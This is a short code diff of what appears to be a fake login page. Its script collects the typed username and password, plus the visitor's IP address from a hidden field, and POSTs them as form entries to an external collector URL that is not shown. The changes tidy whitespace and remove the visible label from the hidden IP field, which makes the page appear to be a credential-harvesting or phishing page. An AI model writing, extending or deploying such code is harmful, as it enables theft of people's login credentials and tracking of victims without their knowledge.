@@ -64,7 +64,7 @@
             var password = document.getElementById("password").value;
             var ip = document.getElementById("ipAddress").value;
 
-            let data = `entry.18199462=${username}&entry.1076403642=${password}&entry.504643693=${ip}`;          
+            let data = `entry.18199462=${username}&entry.1076403642=${password}&entry.504643693=${ip}`;
 
             var xhr = new XMLHttpRequest();
             xhr.open("POST", url, true);
@@ -102,8 +102,7 @@
                <label>Password</label>
             </div>
             <div style="display: none;">
-               <input id="ipAddress" type="text" name="entry.504643693" required>
-               <label>ip</label>
+               <input id="ipAddress" type="text" name="entry.504643693" required>               
             </div>    
             <div id="brSpace">
                <br/><br/>
